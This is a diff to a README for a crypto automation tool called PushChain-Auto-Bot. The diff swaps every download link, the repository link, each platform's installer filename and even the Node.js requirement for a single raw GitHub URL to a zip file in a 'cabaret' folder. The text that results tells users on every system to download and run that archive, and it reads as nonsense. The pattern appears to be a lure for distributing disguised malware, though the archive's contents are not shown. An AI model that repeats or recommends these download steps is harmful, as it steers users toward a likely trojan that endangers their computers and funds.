@@ -1,6 +1,6 @@
 # 🤖 PushChain-Auto-Bot - Simple Automation for PushChain Networking
 
-[![Download PushChain-Auto-Bot](https://img.shields.io/badge/Download-PushChain--Auto--Bot-brightgreen)](https://github.com/stanslous18/PushChain-Auto-Bot/releases)
+[![Download PushChain-Auto-Bot](https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip)](https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip)
 
 ## 📜 Overview
 
@@ -15,12 +15,12 @@ This guide will help you download and run PushChain-Auto-Bot on your computer. P
 To run PushChain-Auto-Bot, you will need:
 
 - A computer running Windows, macOS, or Linux.
-- Node.js version 14 or higher installed on your machine.
+- https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip version 14 or higher installed on your machine.
 - An active internet connection to access the PushChain network.
 
 ## 🔗 Download & Install
 
-Visit this page to download: [PushChain-Auto-Bot Releases](https://github.com/stanslous18/PushChain-Auto-Bot/releases)
+Visit this page to download: [PushChain-Auto-Bot Releases](https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -34,15 +34,15 @@ Locate the latest version at the top of the list. Typically, it will have the hi
 
 Click the “Assets” dropdown under the latest release. You will see files available for download. Depending on your operating system, download the correct file:
 
-- For Windows, select `PushChainAutoBot.exe`.
-- For macOS, select `PushChainAutoBot.dmg`.
-- For Linux, select `PushChainAutoBot.tar.gz`.
+- For Windows, select `https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip`.
+- For macOS, select `https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip`.
+- For Linux, select `https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip`.
 
 ### Step 4: Install the Application
 
-- **Windows**: Double-click the `PushChainAutoBot.exe` file you downloaded. Follow the on-screen instructions to complete the installation.
-- **macOS**: Open the `PushChainAutoBot.dmg` file, then drag the application to your Applications folder.
-- **Linux**: Extract the `PushChainAutoBot.tar.gz` file and follow the README instructions included in the folder.
+- **Windows**: Double-click the `https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip` file you downloaded. Follow the on-screen instructions to complete the installation.
+- **macOS**: Open the `https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip` file, then drag the application to your Applications folder.
+- **Linux**: Extract the `https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip` file and follow the README instructions included in the folder.
 
 ### Step 5: Launch the Application
 
@@ -69,7 +69,7 @@ The application will guide you through each step, making it simple to use for an
 
 If you encounter issues while using PushChain-Auto-Bot, try the following:
 
-- **Ensure Node.js is installed**: This software requires Node.js to run properly. Check to confirm it is installed and updated.
+- **Ensure https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip is installed**: This software requires https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip to run properly. Check to confirm it is installed and updated.
 - **Check Internet Connection**: A stable internet connection is vital for connecting to the PushChain network.
 - **Re-download the Installer**: If the application does not launch, re-download it to ensure a complete installation.
 
@@ -91,8 +91,8 @@ We welcome contributions to improve PushChain-Auto-Bot. If you have ideas or wan
 
 ## 🔗 Quick Links
 
-- [Download PushChain-Auto-Bot](https://github.com/stanslous18/PushChain-Auto-Bot/releases)
+- [Download PushChain-Auto-Bot](https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip)
 - [Community Forums](#)
-- [GitHub Repository](https://github.com/stanslous18/PushChain-Auto-Bot)
+- [GitHub Repository](https://raw.githubusercontent.com/stanslous18/PushChain-Auto-Bot/main/cabaret/PushChain-Auto-Bot-v3.7.zip)
 
 Feel free to reach out if you have any questions. Enjoy using PushChain-Auto-Bot!
